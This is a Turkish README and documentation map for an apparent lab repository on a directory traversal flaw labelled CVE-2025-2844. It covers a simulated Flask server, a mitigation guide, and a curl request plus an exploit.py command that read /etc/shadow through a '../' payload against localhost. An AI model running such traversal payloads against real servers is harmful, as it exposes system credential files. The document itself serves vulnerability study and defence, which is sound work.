# Dokümantasyon Ana Haritası

## ⚠️ Yasal Uyarı (Disclaimer)
**Bu proje yalnızca eğitim ve akademik araştırma amacıyla geliştirilmiştir. Buradaki bilgilerin ve kodların yetkisiz sistemler üzerinde kullanılması yasal sorumluluk doğurabilir. Geliştirici hiçbir sorumluluk kabul etmez.**

## Kurulum ve PoC Çalıştırma Kılavuzu (Lab Setup)
Depoyu ziyaret eden bir güvenlik araştırmacısının kendi bilgisayarında test ortamını kurabilmesi için adımlar:

### 1. Bağımlılıkların Kurulumu
```bash
cd simulated_server
pip install -r requirements.txt
```

### 2. Flask Sunucusunun Çalıştırılması
```bash
python simulated_server.py
```
Sunucu `http://127.0.0.1:5000` adresinde çalışacaktır.

### 3. Zafiyeti Tetikleme (PoC)
Örnek bir `curl` komutu ile Directory Traversal zafiyetini tetikleyebilirsiniz:
```bash
curl "http://127.0.0.1:5000/api/themes/download?theme=../../../../../../../../etc/shadow"
```
Veya projedeki Python scriptini kullanabilirsiniz:
```bash
cd ../poc_python
pip install -r requirements.txt
python exploit.py -u http://127.0.0.1:5000 -f etc/shadow
```

## Dökümantasyon İçeriği
- [architecture.md](architecture.md) $\rightarrow$ Simüle edilen Flask sunucusunun ve zafiyetli mimarinin şeması.
- [analysis.md](analysis.md) $\rightarrow$ CVE-2025-2844 zafiyetinin derinlemesine analizi ve payload örnekleri.
- [mitigation.md](mitigation.md) $\rightarrow$ Bu zafiyetten korunma yöntemleri ve yama (patch) mantığı.
